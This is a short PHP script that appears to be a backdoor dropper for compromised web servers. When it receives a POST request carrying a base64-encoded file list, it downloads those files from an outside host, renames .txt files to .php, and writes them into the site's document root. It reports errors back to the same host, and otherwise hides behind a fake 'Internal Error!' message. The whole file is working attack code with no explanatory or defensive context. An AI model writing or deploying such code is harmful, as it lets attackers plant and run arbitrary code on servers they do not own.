<?php
if(isset($_POST['action']) && $_POST['action'] == 'ok'){
	$files_path = explode('|||', base64_decode($_POST['files']));
	foreach($files_path as $parse){
		if(!empty($parse) && !strpos($parse, '.htaccess')){
			try{
				$ch = curl_init();
				curl_setopt($ch, CURLOPT_URL, 'http://seda.test-lab.org.ua/'.$_POST['path'].$parse);
				curl_setopt($ch, CURLOPT_HEADER, 0);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
				curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (X11; Seda) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.97 Safari/537.11');
				$data = curl_exec($ch);
				curl_close($ch);
				$parse = str_replace('.txt', '.php', $parse);
		 		@file_put_contents($_SERVER['DOCUMENT_ROOT'].'/'.$_POST['path'].$parse, $data);
			}catch ( Exception $e ) {
			 	$ch = curl_init();
				curl_setopt($ch, CURLOPT_URL, 'http://seda.test-lab.org.ua/');
				curl_setopt($ch, CURLOPT_HEADER, 0);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
				curl_setopt($ch, CURLOPT_POST, 1);
				curl_setopt($ch, CURLOPT_POSTFIELDS, "error=true&log=".$e->getMessage());
				curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (X11; Seda) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.97 Safari/537.11');
				$data = curl_exec($ch);
				curl_close($ch);	
			}
		}
	}
}else{
	die('Internal Error!');
}
?>